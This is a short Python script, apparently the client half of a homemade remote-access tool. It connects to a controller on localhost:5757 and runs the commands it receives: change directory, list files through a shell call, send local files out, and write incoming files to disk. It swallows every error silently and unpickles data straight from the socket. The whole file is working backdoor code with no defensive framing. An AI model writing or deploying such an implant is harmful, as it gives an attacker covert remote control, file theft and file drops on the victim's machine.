import socket
import pickle
import sys, os, subprocess

s = socket.socket()
s.connect(('localhost', 5757))

def getfulname(com):
    name = ""
    l = len(com)
    for i in range(1,l, 1):
        name = name + com[i] + " "
    return name

def send(rc):
    size = sys.getsizeof(rc)
    s.send(pickle.dumps(size))
    ec = pickle.dumps(rc)
    s.send(ec)


def recv():
    size = s.recv(1024)
    res = s.recv(pickle.loads(size))
    res = pickle.loads(res)
    return res

def chdir(dir):
    dir = getfulname(dir)
    os.chdir(dir)
    send("[+] Changed...")

def listdir():
    res = subprocess.check_output("dir", shell=True)
    send(res)

def writefile(name, data):
    file = open(name,"wb")
    file = file.write(data)

def readfile(name):
    file = open(name,"rb")
    file = file.read()
    return file

def download(name):
    name = getfulname(name)
    size = os.path.getsize(name)
    send(size)
    data = readfile(name)
    s.sendall(data)

def upload(com):
    size = recv()
    data = s.recv(size)
    name = getfulname(com)
    writefile(name, data)


print("Connected")

while True:
    try:
        com = recv()

        if(com[0] == 'exit'):
            sys.exit()

        elif(com[0] == "cd"):
            chdir(com)

        elif(com[0] == "dir"):
            listdir()

        elif(com[0] == "download"):
            download(com)

        elif(com[0] == "upload"):
            upload(com)

    except:
        continue